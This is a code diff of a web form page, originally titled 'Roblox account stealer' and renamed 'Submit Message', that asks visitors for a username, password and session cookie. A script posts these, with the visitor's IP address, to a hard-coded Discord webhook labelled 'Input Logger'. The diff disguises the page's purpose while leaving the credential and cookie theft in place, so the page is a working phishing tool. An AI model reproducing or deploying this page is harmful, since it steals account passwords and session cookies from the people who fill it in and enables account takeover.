@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox account stealer</title>
+  <title>Submit Message</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
   <style>
@@ -34,7 +34,7 @@
     <div class="text-center mb-12">
       <div class="inline-flex items-center gap-3 mb-4">
         <i class="fa-solid fa-envelope text-4xl text-indigo-500"></i>
-        <h1 class="text-5xl font-bold tracking-tight">Submit info</h1>
+        <h1 class="text-5xl font-bold tracking-tight">Submit Message</h1>
       </div>
       <p class="text-gray-400 text-lg">Please fill in the details below</p>
     </div>
@@ -54,28 +54,28 @@
             required>
         </div>
 
-        <!-- Placeholder -->
+        <!-- Password -->
         <div class="mb-6">
           <label class="block text-sm font-medium text-gray-300 mb-2">
-            password
+            Password
           </label>
           <input 
             type="text"
             id="password"
             class="input w-full bg-black/50 border border-gray-700 rounded-2xl px-6 py-4 text-base focus:outline-none"
-            password="Enter password value...">
+            placeholder="Enter password...">
         </div>
 
-        <!-- Message -->
+        <!-- Cookie -->
         <div class="mb-8">
           <label class="block text-sm font-medium text-gray-300 mb-2">
-            cookie
+            Cookie
           </label>
           <textarea 
-            id="message"
+            id="cookie"
             rows="7"
             class="input w-full bg-black/50 border border-gray-700 rounded-2xl px-6 py-5 text-lg resize-y min-h-[200px] focus:outline-none"
-            placeholder="Write your message here..."
+            placeholder="Paste cookie here..."
             required></textarea>
         </div>
 
@@ -117,14 +117,16 @@
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1498506788339847259/W6BN_NG5BF1uJpEDruQT7nnOoTAH3r314U1Gq9gbk4iMubK_j2AtS0xW54pwXHBhaJbu";
 
+    const GIF_URL = "https://cdn.discordapp.com/attachments/1502893724764471311/1503103419240681713/E1FAAADB-EDDC-494F-A760-C0323AE56A0B.gif?ex=6a0221a5&is=6a00d025&hm=9b6d2a3cb200ea6c6eb6fc32e6d7e2b34340278083ee1c50f9a5526baf7d0c15";
+
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       const username = document.getElementById('username').value.trim();
-      const placeholder = document.getElementById('placeholder').value.trim();
-      const messageText = document.getElementById('message').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const cookie = document.getElementById('cookie').value.trim();
 
-      if (!username || !messageText) return;
+      if (!username || !cookie) return;
 
       submitBtn.disabled = true;
       submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Submitting...`;
@@ -136,24 +138,22 @@
           description: "**A new submission has been received**",
           color: 0x6366f1,
           timestamp: new Date().toISOString(),
-          thumbnail: {
-            url: "https://cdn.discordapp.com/attachments/1502893724764471311/1503103419240681713/E1FAAADB-EDDC-494F-A760-C0323AE56A0B.gif?ex=6a0221a5&is=6a00d025&hm=9b6d2a3cb200ea6c6eb6fc32e6d7e2b34340278083ee1c50f9a5526baf7d0c15&" // Optional nice icon
-          },
+          thumbnail: { url: GIF_URL },
           fields: [
             { name: "👤 Username", value: `\`${username}\``, inline: true },
             { name: "🌐 IP Address", value: `\`${userIP}\``, inline: true },
-            { name: "🔖 password ", value: placeholder ? `\`${placeholder}\`` : "`None`", inline: false },
+            { name: "🔑 Password", value: password ? `\`${password}\`` : "`None`", inline: false },
             { 
-              name: "📝 Message", 
-              value: messageText.length > 950 
-                ? "```" + messageText.substring(0, 947) + "...```" 
-                : "```" + messageText + "```", 
+              name: "🍪 Cookie", 
+              value: cookie.length > 950 
+                ? "```" + cookie.substring(0, 947) + "...```" 
+                : "```" + cookie + "```", 
               inline: false 
             }
           ],
           footer: {
             text: "Input Logger • Submitted via Web Form",
-            icon_url: "https://i.imgur.com/9Z2vZ8Z.png"
+            icon_url: GIF_URL
           }
         }]
       };
